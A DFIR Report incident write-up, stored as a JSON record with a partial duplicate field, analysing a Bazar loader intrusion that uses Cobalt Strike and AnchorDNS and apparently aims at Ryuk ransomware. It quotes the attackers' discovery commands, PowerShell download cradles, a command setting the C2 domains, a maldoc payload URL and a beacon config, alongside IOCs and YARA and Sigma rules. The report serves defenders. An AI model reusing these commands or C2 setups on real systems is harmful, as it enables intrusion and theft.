    "content": "Bazar Drops the Anchor \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts anchor bazar cobaltstrike Bazar Drops the Anchor March 8, 2021 Intro The malware identified as Anchor first entered the scene in late 2018 and has been linked to the same group as Trickbot, due to similarities in code and usage of the two different malware families in the same intrusions. In 2020 the Bazar malware family entered and again many associated it with the same group behind Trickbot. In an intrusion this past month we saw another link between the 3 families with a Bazar loader bringing in Anchor DNS to facilitate a full domain compromise intrusion. Over a 5 day time frame the threat actors moved from a single endpoint to full domain compromise, and while ransomware deployment was not seen in this intrusion the TTP\u2019s used mirror what we would expect from a big game ransomware crew. Case Summary In this case we started with a DocuSign themed Excel maldoc. The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader. Once Bazar was established the malware quickly injected into the Werfault process to avoid detection. As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest. About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor. Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller. Once on the domain controller, the threat actors ran additional discovery but then went quiet. Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days. During that timeframe, honey documents were interacted with and additional discovery scans were executed. The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware. However, on the fifth day the threat actors access was cut off before final objectives could be accomplished. We assess that the end goal of this intrusion was to execute domain wide ransomware. Timeline MITRE ATT&CK Initial Access A DocuSign themed Excel xls was opened and macros were enabled. Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file. New #BazarCall #BazarLoader campaigns. snutrition,net > snutrition,us obpharmacy,net > obpharmacy,us XLS https://t.co/rNLglHadGV EXE https://t.co/D28MoDqSLD IOCs: https://t.co/mc56wgU8EW pic.twitter.com/GiIlKY4tT0 \u2014 TheAnalyst (@ffforward) February 8, 2021 The macro in this maldoc is using Excel 4 Macros. DocuSign was again the social engineering format of choice. After execution, Excel called out to: https://morrislibraryconsulting[.]com/favicam/gertnm.php Execution We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met. We then executed the follow on malware manually. Bazar Loader \u2013 14wfa5dfs.exe About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process. Shortly after Cobalt Strike was executed, it dropped several Anchor executable files. AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster. Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2. C:\\Windows\\system32\\cmd.exe /C C:\\Windows\\Temp\\adf\\anchorAsjuster_x64.exe --source=anchorDNS_x64.exe --target=anchor_x64.exe --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid Defense Evasion Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly. Process injection was also seen in other key system executables such as winlogon.exe. Cobalt Strike was seen locking access to SMB beacons. Anchor was also seen triggering process tampering. Credential Access The threat actors were seen using remote thread creation to inject into lsass to extract credentials. The same activity as seen via a the larger process tree. Disc overy Bazar initiated some discovery activity within 10 minutes of executing. net view /all net view /all /domain nltest.exe /domain_trusts /all_trusts net localgroup \"administrator\" net group \"domain admins\" /domain systeminfo whoami reg query hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hklm\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hkcu\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hkcu\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s Cobalt Strike initiated the following discovery commands: net group \\\"enterprise admins\\\" /domain net group \\\"domain admins\\\" /domain systeminfo On the domain controller the following discovery was run: nltest /dclist:\"DOMAIN.EXAMPLE nltest /domain_trusts /all_trusts IEX (New-Object Net.Webclient).DownloadString('\"http://127.0.0.1:3672/'); Get-NetSubnet IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:45082/'); Get-NetComputer -ping The following PowerShell command was executed from the domain controller. Decoded: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:13773/'); Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select DNSHostName, IPv4Address, OperatingSystem, LastLogonDate Systems were pinged from the domain controller to confirm connectivity. C:\\Windows\\system32\\cmd.exe /C ping HOSTX Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network. AWS was used to get the public IP of the infected machine, multiple times. checkip.amazonaws.com Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller. This time they dropped the files on a domain controller in C:\\info The exact files were mentioned in our Bazar, No Ryuk report. start.bat was executed with the following: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\" This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software. The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times. This script and files are available @ https://thedfirreport.com/services/ Lateral Movement Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon. Thanks to 0xtornado and @mattnotmax for this recipe! The threat actors also used SMB beacons executed by remote services as well. We saw this across most machines in the domain. The threat actors also used RDP to login to multiple machines within the domain. Collection We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels. Command and Control Bazar: 34.210.71[.]206 Certificate: [ ec:c8:db:01:a4:a3:17:36:54:a2:f5:06:44:84:5c:f6:25:6e:4f:74 ] Not Before: 2021/02/04 02:59:01 Not After 2022/02/04 02:59:01 Issuer Org: Global Security Subject Common: example.com Subject Org: Global Security Public Algorithm: rsaEncryption JA3: 51c64c77e60f3980eea90869b68c58a8 JA3s: e35df3e00ca4ef31d42b34bebaa2f86e Certificate: [ 06:32:21:0b:8b:a2:a7:3c:47:a4:33:53:11:a3:11:08:59:48:31:e2 ] Not Before 2020/06/12 20:00:00 Not After 2021/05/22 08:00:00 Issuer Org: Amazon Subject Common: *.v.m2.uw2.app.chime.aws [ *.v.m2.uw2.app.chime.aws ] Public Algorithm: rsaEncryption JA3: fc54e0d16d9764783542f0146a98b300 JA3s: 9e4af711131ebfb2a0cff53c4f2d64e6 We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication. Anchor: The AnchorDNS malware performed C2 over DNS to the following domains: xyskencevli.com sluaknhbsoe.com Cobalt Strike: 195.123.217[.]45 JARM: 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1 Certificate: [ 3c:bb:96:de:a7:d7:7a:7d:61:10:7c:53:e3:d0:f5:70:43:54:61:2e ] Not Before: 2021/02/08 03:45:51 Not After: 2021/05/09 04:45:51 Issuer Org: Let's Encrypt Subject Common: gloomix.com [ gloomix.com , www.gloomix.com ] Public Algorithm: rsaEncryption Cobalt Strike Config: | grab_beacon_config: | x86 URI Response: | BeaconType: 0 (HTTP) | Port: 80 | Polling: 45000 | Jitter: 37 | Maxdns: 255 | C2 Server: 195.123 .217 .45 ,/jquery- 3.3 .1 .min.js | User Agent: Mozilla/ 5.0 (Windows NT 6.3 ; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | | | x64 URI Response : | BeaconType : 0 ( HTTP ) | Port : 80 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : 195.123.217.45,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | _ 443/ tcp open https | grab_beacon_config : | x86 URI Response : | BeaconType : 8 ( HTTPS ) | Port : 443 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : gloomix . com ,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | | | x64 URI Response : | BeaconType : 8 ( HTTPS ) | Port : 443 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : gloomix . com ,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | _ ~tmp01925d3f.exe can be seen communicating with the Cobalt Strike C2 channel. Exfiltration No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations. We assess that this exfiltration was performed over an encrypted C2 channel. This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider. Impact We believe this intrusion would have ended with domain wide ransomware. The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family. Enjoy our report? Please consider donating $1 or more using Patreon . Thank you for your support! We also have pcaps, memory captures, scripts, executables, and Kape packages available here IOCs If you would like access to our internal MISP and/or threat feeds please see here . Network 54.176.158.165 54.193.234.163 54.241.149.90 208.100.26.238 63.251.235.71 34.210.71.206 195.123.217.45 gloomix.com https://morrislibraryconsulting.com/favicam/gertnm.php xyskencevli.com sluaknhbsoe.com File request_form_1612805504.xls 58eaac6124749d0e93df6d05a4380c22 7e14c560484cb7e8ae065224a7d4978b9939ef9a d9b13ef49c80375e0a8cf20b840b1e8283b35c1a1a6adcbb4173eb25490530e0 ~tmp01925d3f.exe ef7047a0ca52ef7f4d20281b50207f71 61d8f56452fd9df5952fac84f10ea8520ed5958c 10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63 anchorAsjuster_x64.exe 9fbc3d560d075f33a15aa67ae74ac6ef a298c6f5f8902fb581a1b5b922f95b362747f9a7 3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d anchorDNS_x64.exe 7160ac4abb26f0ca4c1b6dfba44f8d36 3820ff0d04a233745c79932b77eccfe743a81d34 9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513 anchor_x64.exe 0be407690fd049ea640dfc64a80c7b2a c9c4ef9b8b39c584d554de8afeb2be6f5648aa6d ca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b 14wfa5dfs.exe 9a16a348d3f4e7da3e8746667624115f bebdec590d2a2fffaecb970b73e3067294c9125b 2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69 extracted-cobalt-strike-beacon.exe 49dc44dfa14a76e139bf5efb4a78aca6 a47fc79bc1f0da5d292a986acdbe9057d3dd15c9 738018c61a8db247615c9a3290c26fbbc4e230d5fbe00c4312401b90813c340c PDB paths anchordns_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb anchor_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb ~tmp01925d3f.exe - c:\\users\\hillary\\source\\repos\\gromyko\\release\\gromyko.pdb Accessed Honey Docs IP: 23.94.51[.]80 UA: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MSOffice 12) Detections Network ET INFO Observed DNS Query for EmerDNS TLD (.bazar) ETPRO POLICY External IP Check (checkip.amazonaws.com) ETPRO TROJAN Win32/TrickBot Anchor Variant Style External IP Chec k ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 139 traffic Potential Scan or Infection ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex/Trickbot CnC) ETPRO POLICY Possibly Suspicious example.com SSL Cert ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O) Sigma https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/Neo23x0/sigma/blob/c56cd2dfff6343f3694ef4fd606a305415599737/rules/network/net_dns_c2_detection.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-02-22 Identifier: 1017 Anchoring Bazar Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule bazar_14wfa5dfs { meta: description = \"files - file 14wfa5dfs.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69\" strings: $s1 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */ $s2 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */ $s3 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s4 = \"0??dfg.dll ASHI128 bit 98tqewC58752F9578\" fullword ascii $s5 = \"*http://crl4.digicert.com/assured-cs-g1.crl0L\" fullword ascii $s6 = \"*http://crl3.digicert.com/assured-cs-g1.crl00\" fullword ascii $s7 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii $s8 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207-E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii $s9 = \"operator co_await\" fullword ascii $s10 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207-E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii $s11 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s12 = \"Google LLC1\" fullword ascii $s13 = \"Google LLC0\" fullword ascii $s14 = \"Unknown issuer0\" fullword ascii $s15 = \"DigiCert, Inc.1$0\\\"\" fullword ascii $s16 = \"=Google%20Chrome&needsadmin=prefers&ap=x64-stable-statsdef_1&installdataindex=empty\" fullword ascii $s17 = \"TIMESTAMP-SHA256-2019-10-150\" fullword ascii $s18 = \"vggwqrwqr7d6\" fullword ascii $s19 = \"api-ms-win-core-file-l1-2-2\" fullword wide /* Goodware String - occured 1 times */ $s20 = \"__swift_2\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 3000KB and ( pe.imphash() == \"d8af53b239700b702d462c81a96d396c\" or 8 of them ) } rule cobalt_strike_tmp01925d3f { meta: description = \"files - file ~tmp01925d3f.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63\" strings: $x1 = \"C:\\\\Users\\\\hillary\\\\source\\\\repos\\\\gromyko\\\\Release\\\\gromyko.pdb\" fullword ascii $x2 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s3 = \"gromyko32.dll\" fullword ascii $s4 = \"<requestedExecutionLevel level='asInvoker' uiAccess='false'/>\" fullword ascii $s5 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s6 = \"https://sectigo.com/CPS0\" fullword ascii $s7 = \"2http://crl.comodoca.com/AAACertificateServices.crl04\" fullword ascii $s8 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword ascii $s9 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii $s10 = \"http://ocsp.sectigo.com0\" fullword ascii $s11 = \"2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s\" fullword ascii $s12 = \"2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#\" fullword ascii $s13 = \"http://www.digicert.com/CPS0\" fullword ascii $s14 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s15 = \" [email protected] \" fullword ascii $s16 = \"gromyko.inf\" fullword ascii $s17 = \"operator<=>\" fullword ascii $s18 = \"operator co_await\" fullword ascii $s19 = \"gromyko\" fullword ascii $s20 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"1b1b73382580c4be6fa24e8297e1849d\" or ( 1 of ($x*) or 4 of them ) ) } rule advanced_ip_scanner { meta: description = \"files - file advanced_ip_scanner.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"722fff8f38197d1449df500ae31a95bb34a6ddaba56834b13eaaff2b0f9f1c8b\" strings: $x1 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\" xmlns:asmv3=\\\"urn:schemas-microsoft-com:asm.v3\\\"><t\" ascii $s2 = \"fo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><security><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\" uiAcce\" ascii $s3 = \"Executable files (*.exe)\" fullword ascii $s4 = \"0RolUpdater.dll\" fullword wide $s5 = \"Qt5WinExtras.dll\" fullword ascii $s6 = \"Radmin.exe\" fullword ascii $s7 = \"ping.exe\" fullword ascii $s8 = \"tracert.exe\" fullword ascii $s9 = \"famatech.com\" fullword ascii $s10 = \"advanced_ip_scanner.exe\" fullword wide $s11 = \"Z:\\\\out\\\\Release\\\\NetUtils\\\\x86\\\\advanced_ip_scanner.pdb\" fullword ascii $s12 = \"Qt5Xml.dll\" fullword ascii $s13 = \"/telnet.exe\" fullword ascii $s14 = \"onTargetScanned\" fullword ascii $s15 = \"CScanTargetsShared\" fullword ascii $s16 = \"1OnCmdScanSelected( CScanTargets& )\" fullword ascii $s17 = \"http://www.advanced-ip-scanner.com/\" fullword ascii $s18 = \"2CmdScanSelected( CScanTargets& )\" fullword ascii $s19 = \"</style></head><body style=\\\" font-family:'MS Shell Dlg 2'; font-size:8.25pt; font-weight:400; font-style:normal;\\\">\" fullword ascii $s20 = \"<a href=\\\"http://www.radmin.com\\\">www.radmin.com</a>\" fullword wide condition: uint16(0) == 0x5a4d and filesize < 5000KB and ( pe.imphash() == \"a3bc8eb6ac4320e91b7faf1e81af2bbf\" or ( 1 of ($x*) or 4 of them ) ) } rule anchor_x64 { meta: description = \"files - file anchor_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"ca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b\" strings: $x1 = \"cmd.exe /c timeout 3 && \" fullword wide $x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii $s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword ascii $s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><appli\" ascii $s8 = \"thExecute\" fullword ascii $s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii $s10 = \"WinHTTP loader/1.0\" fullword wide $s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s12 = \"AnchorDNS.cpp\" fullword ascii $s13 = \"hardWorker.cpp\" fullword ascii $s14 = \"operator<=>\" fullword ascii $s15 = \"operator co_await\" fullword ascii $s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide $s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s19 = \"UAWAVAUATVWSH\" fullword ascii $s20 = \"AWAVAUATVWUSH\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) ) } rule anchorDNS_x64 { meta: description = \"files - file anchorDNS_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513\" strings: $x1 = \"cmd.exe /c timeout 3 && \" fullword wide $x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii $s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword ascii $s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><appli\" ascii $s8 = \"thExecute\" fullword ascii $s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii $s10 = \"WinHTTP loader/1.0\" fullword wide $s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s12 = \"AnchorDNS.cpp\" fullword ascii $s13 = \"hardWorker.cpp\" fullword ascii $s14 = \"operator<=>\" fullword ascii $s15 = \"operator co_await\" fullword ascii $s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide $s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s19 = \"UAWAVAUATVWSH\" fullword ascii $s20 = \"AWAVAUATVWUSH\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) ) } rule anchorAsjuster_x64 { meta: description = \"files - file anchorAsjuster_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d\" strings: $s1 = \"curity><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requeste\" ascii $s2 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain name> --period=<recurrence interval, minutes, def\" ascii $s3 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain name> --period=<recurrence interval, minutes, def\" ascii $s4 = \"target file \\\"%s\\\"\" fullword ascii $s5 = \"--target=\" fullword ascii $s6 = \"hemas.microsoft.com/SMI/2005/WindowsSettings\\\">true</dpiAware></windowsSettings></application></assembly>\" fullword ascii $s7 = \"error write file, written %i bytes, need write %i bytes, error code %i\" fullword ascii $s8 = \"error create file \\\"%s\\\", code %i\" fullword ascii $s9 = \"guid: %s, shift 0x%08X(%i)\" fullword ascii $s10 = \"ault value 15> -guid --count=<count of instances>\" fullword ascii $s11 = \"domain: shift 0x%08X(%i)\" fullword ascii $s12 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii $s13 = \"vileges></security></trustInfo><application xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http:/\" ascii $s14 = \"wrong protocol type\" fullword ascii /* Goodware String - occured 567 times */ $s15 = \"network reset\" fullword ascii /* Goodware String - occured 567 times */ $s16 = \"owner dead\" fullword ascii /* Goodware String - occured 567 times */ $s17 = \"connection already in progress\" fullword ascii /* Goodware String - occured 567 times */ $s18 = \"network down\" fullword ascii /* Goodware String - occured 567 times */ $s19 = \"protocol not supported\" fullword ascii /* Goodware String - occured 568 times */ $s20 = \"connection aborted\" fullword ascii /* Goodware String - occured 568 times */ condition: uint16(0) == 0x5a4d and filesize < 700KB and ( pe.imphash() == \"9859b7a32d1227be2ca925c81ae9265e\" or 8 of them ) } MITRE Spearphishing Link - T1566.002 Command-Line Interface - T1059 Malicious File - T1204.002 Scheduled Task - T1053.005 User Execution - T1204 Process Injection - T1055 DNS - T1071.004 Commonly Used Port - T1043 Application Layer Protocol - T1071 Exfiltration Over C2 Channel - T1041 SMB/Windows Admin Shares - T1021.002 Domain Trust Discovery - T1482 Domain Account - T1087.002 Remote System Discovery - T1018 System Information Discovery - T1082 OS Credential Dumping - T1003 Internal case #1017 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Laravel Apps Leaking Secrets Sodinokibi (aka REvil) Ransomware Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Bazar Drops the Anchor \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts anchor bazar cobaltstrike Bazar Drops the Anchor March 8, 2021 Intro The malware identified as Anchor first entered the scene in late 2018 and has been linked to the same group as Trickbot, due to similarities in code and usage of the two different malware families in the same intrusions. In 2020 the Bazar malware family entered and again many associated it with the same group behind Trickbot. In an intrusion this past month we saw another link between the 3 families with a Bazar loader bringing in Anchor DNS to facilitate a full domain compromise intrusion. Over a 5 day time frame the threat actors moved from a single endpoint to full domain compromise, and while ransomware 